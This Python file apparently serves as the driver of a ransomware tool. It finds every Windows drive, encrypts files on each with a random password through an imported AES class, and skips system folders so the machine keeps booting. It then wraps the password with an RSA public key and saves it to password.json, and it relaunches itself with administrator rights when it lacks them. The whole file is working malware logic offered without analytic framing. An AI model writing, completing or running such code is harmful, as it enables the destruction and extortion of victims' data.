from __future__ import print_function
import base64
import os
import sys
import string
import ctypes
import multiprocessing
from time import perf_counter
from string import ascii_letters, digits, punctuation
from random import choices

from aes_class import LockPath
from rsa_class import RSA_Class


def get_password():
    pw = ''.join(choices(ascii_letters + digits 
    + punctuation, k=32))
    return pw

def get_disklist():

    disk_list = []
    for letter in string.ascii_uppercase:
        disk = letter + ":/"
        if os.path.isdir(disk):
            disk_list.append(disk)  
    return disk_list

def timeit(func):
    def wrapper():
        start = perf_counter()
        func()
        end = perf_counter()
        print(end - start)
        
    return wrapper


def encrypt_sys(): 

    try:
        public_key = RSA_Class.load_pub("./rsapub.pem") 
    except FileNotFoundError as e:
        print(e)
        print("press any key to quit")
        
        sys.exit(0)

    WHITE_DIRS = ['RECOVERY', 'DOCUMENTS AND SETTINGS', 'TESTLOCKSYSTEM', 'PROGRAMDATA', 'PROGRAM FILES (X86)', 'WINDOWS', 'PROGRAM FILES', '$WINDOWS.~WS', 'INTEL', 'MOZILLA', 'APPLICATION DATA', 'PERFLOGS', 'TOR BROWSER', '$WINDOWS.~BT', 'GOOGLE', '$RECYCLE.BIN', 'APPDATA', 'MSOCACHE', 'BOOT', 'WINDOWS.OLD', 'SYSTEM VOLUME INFORMATION']
    WHITE_FILES =  ['NTLDR', 'NTUSER.DAT', 'NTUSER.DAT.LOG', 'AUTORUN.INF', 'THUMBS.DB', 'BOOTSECT.BAK', 'BOOTFONT.BIN', 'NTUSER.INI', 'DESKTOP.INI', 'BOOT.INI', 'ICONCACHE.DB'] 
    
    encrypt_size = 16 * 1024 * 1024
    decrypt_size = encrypt_size + 32
    keylen = 32
    ivlen = 16
    password = get_password()
    disk_list = get_disklist()
    print(disk_list)

    L = LockPath(disk_list, WHITE_DIRS, WHITE_FILES, 
    encrypt_size, decrypt_size, password, keylen, ivlen)
    L.multiprocessing_lock_path()

    # public_key = RSA_Class.load_pub("./rsapub.pem")  
    password = password.encode()
    password = RSA_Class.encryption(public_key, password)
    password = base64.b64encode(password)
    password = password.decode()
    RSA_Class.save("./password.json", password)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

@timeit
def main():
    if is_admin():
        encrypt_sys()
    else:
        if sys.version_info[0] == 3:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        else:#in python2.x
            ctypes.windll.shell32.ShellExecuteW(None, u"runas", unicode(sys.executable), unicode(__file__), None, 1)
    
if __name__ == "__main__":
    multiprocessing.freeze_support()
    multiprocessing.set_start_method("spawn")
    main()